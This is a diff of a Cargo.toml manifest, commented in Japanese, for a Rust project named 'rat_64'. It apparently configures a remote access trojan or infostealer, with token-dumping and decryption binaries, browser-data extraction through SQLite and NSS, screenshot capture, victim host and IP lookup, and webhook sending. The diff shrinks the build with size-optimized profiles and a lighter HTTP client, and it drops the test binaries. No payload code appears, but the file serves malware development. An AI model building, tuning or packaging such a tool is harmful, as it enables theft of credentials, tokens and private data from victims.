@@ -25,21 +25,17 @@ overflow-checks = true
 incremental = true
 debug-assertions = true
 
-# サイズ最適化用
-[profile.release-small]
+[profile.release-tiny]
 inherits = "release"
 opt-level = "z"
-lto = "fat"
+lto = "fat" 
 codegen-units = 1
 panic = "abort"
 strip = "symbols"
-
-# パフォーマンス最適化用
-[profile.performance]
-inherits = "release"
-opt-level = 3
-lto = "fat"
-codegen-units = 1
+debug = false
+rpath = false
+overflow-checks = false
+debug-assertions = false
 
 [lib]
 name = "rat_64"
@@ -51,24 +47,11 @@ path = "src/main.rs"
 
 [[bin]]
 name = "decrypt"
-path = "src/bin/decrypt.rs"
+path = "src/bin/data_decrypt.rs"
 
 [[bin]]
 name = "token_dump"
-path = "src/bin/token_dump.rs"
-
-[[bin]]
-name = "debug_key"
-path = "src/bin/debug_key.rs"
-
-[[bin]]
-name = "test_os_info"
-path = "src/bin/test_os_info.rs"
-
-[[bin]]
-name = "test_browser_dump"
-path = "src/bin/test_browser_dump.rs"
-required-features = ["browser"]
+path = "src/bin/token_extractor.rs"
 
 # ---------------------------
 # 依存関係（安定運用向け設定）
@@ -99,58 +82,79 @@ aes-gcm = { version = "0.10", default-features = false, features = ["aes", "allo
 whoami = { version = "1.5", default-features = false }
 local_ipaddress = { version = "0.1", default-features = false }
 
-# 段階的バイナリサイズ削減（保守的アプローチ）
-anyhow = "1.0"  # エラー処理の核心部分は保持
-# clap = { version = "4.0", features = ["derive"] }  # 標準ライブラリ版CLIで置換完了 ✅
-# csv = "1.2"  # 標準ライブラリ版CSVで置換完了 ✅
-# dirs = "6.0.0"  # 標準ライブラリで置換完了 ✅
-libloading = "0.8"  # NSSで必要
-log = "0.4"  # デバッグ用に保持（将来的にprintln!置換）
-# shellexpand = "3.0"  # 標準ライブラリで置換完了 ✅
-thiserror = "2.0.16"  # エラー処理の核心部分は保持
-which = "8.0.0"  # NSSで必要
+# 段階的バイナリサイズ削減（バランス重視）
+anyhow = { version = "1.0", default-features = false }  # エラー処理（最小化）
+libloading = { version = "0.8", default-features = false }  # NSSで必要
+which = { version = "8.0.0", default-features = false, features = ["real-sys"] }  # NSSで必要
+thiserror = { version = "2.0.16", default-features = false }  # エラー処理マクロ
 
-# chomeium_dump用依存関係（最小化）
-indicatif = { version = "0.17", default-features = false, features = ["unicode-width"] }
+# 条件付き依存関係（機能別）
+log = { version = "0.4", default-features = false, optional = true }  # ログ機能
+indicatif = { version = "0.17", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
+chrono = { version = "0.4", default-features = false, features = ["clock", "std"], optional = true }  # 時刻処理
+
+# 必須依存関係（最小化）
 tempfile = { version = "3.8", default-features = false }
 walkdir = { version = "2.3", default-features = false }
-# env_logger = "0.10"  # println!マクロで置換
-chrono = { version = "0.4", default-features = false, features = ["clock", "std"] }  # 一時的に保持（段階削減のため）
 
-# ---- optional features グループ ----
+# ---- Feature設定（統一・最適化済み） ----
 [features]
-default = ["minimal"]
-minimal = []
-webhook = ["dep:reqwest", "dep:tokio"]
-screenshot = ["dep:image", "dep:scrap"]
-browser = ["dep:rusqlite"]
-database = ["dep:rusqlite"]
-extended-modules = ["browser", "screenshot"]
-all-modules = ["extended-modules", "webhook"]
+# デフォルト設定（最小構成）
+default = ["core"]
+
+# 基本機能セット
+core = []
+
+# 個別モジュール機能
+webhook = ["dep:minreq", "dep:chrono"]       # Webhook送信（軽量HTTPクライアント）
+screenshot = ["dep:image", "dep:scrap"]                   # スクリーンショット機能
+browser = ["dep:rusqlite"]                                # ブラウザデータ取得機能
+
+# UI/UX機能
+progress-bar = ["dep:indicatif"]                          # プログレスバー表示
+logging = ["dep:log"]                                     # ログ機能
+datetime = ["dep:chrono"]                                 # 日時処理
+
+# サイズ最適化用機能フラグ
+ui-minimal = []                                           # UI要素を最小化（progress-bar除外）
+crypto-minimal = []                                       # 暗号化機能を最小化
+size-optimized = ["ui-minimal", "crypto-minimal"]        # 総合サイズ最適化
+
+# データベース機能（browserのエイリアス、後方互換性のため）
+database = ["browser"]
+
+# 機能グループ（段階的構成）
+basic = ["core", "browser", "datetime"]                     # 基本機能：コア + ブラウザ + 日時
+extended = ["basic", "screenshot", "progress-bar"]          # 拡張機能：基本 + スクリーンショット + UI
+full = ["extended", "webhook", "logging"]                   # 全機能：拡張 + Webhook + ログ
+
+# サイズ最適化構成
+compact = ["core", "browser", "size-optimized"]            # コンパクト版（3MB目標）
+lite = ["core", "browser"]                                  # 軽量版（UI最小）
+
+# 便利なエイリアス
+all-modules = ["full"]                                      # 全モジュール有効
+minimal = ["core"]                                          # 最小構成
 
 # optional deps（必要時だけ読み込む）
-[dependencies.reqwest]
-version = "0.12"
+[dependencies.minreq]
+version = "2.12"
 default-features = false
-features = ["json", "rustls-tls", "blocking"]
+features = ["https-rustls"]
 optional = true
 
-[dependencies.tokio]
-version = "1.47"
-default-features = false
-features = ["rt", "macros"]
-optional = true
+
 
 [dependencies.image]
 version = "0.25"
 default-features = false
-features = ["png", "jpeg"]
+features = ["png"]  # JPEG不要なら削減
 optional = true
 
 [dependencies.rusqlite]
 version = "0.37.0"
 default-features = false
-features = ["bundled"]
+features = ["bundled", "modern_sqlite"]  # 最小限の機能のみ
 optional = true
 
 [dependencies.scrap]
